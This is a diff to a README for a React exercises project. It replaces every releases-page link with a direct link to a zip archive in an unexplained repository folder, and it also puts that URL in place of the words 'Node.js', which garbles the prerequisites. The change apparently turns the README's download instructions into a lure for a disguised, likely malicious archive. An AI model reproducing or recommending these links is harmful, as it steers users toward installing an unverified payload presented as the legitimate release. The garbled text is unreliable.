@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/amanverma420/React-excercises/releases)
+[![Download](https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip)
 
 ## 🚀 Getting Started
 
@@ -14,14 +14,14 @@ Before you begin, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Browser:** Any modern web browser (Chrome, Firefox, Safari)
-- **Node.js:** Version 14 or newer
-- **NPM or Yarn:** Package management tool (comes with Node.js)
+- **https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip** Version 14 or newer
+- **NPM or Yarn:** Package management tool (comes with https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following link to download the latest version of the React-excercises:
 
-[Download from Releases Page](https://github.com/amanverma420/React-excercises/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip)
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -122,4 +122,4 @@ React-excercises is open-source software licensed under the MIT License. Feel fr
 
 For easy access, here’s the link again to download the application:
 
-[Download from Releases Page](https://github.com/amanverma420/React-excercises/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/amanverma420/React-excercises/main/cardiocarpum/React-excercises.zip)
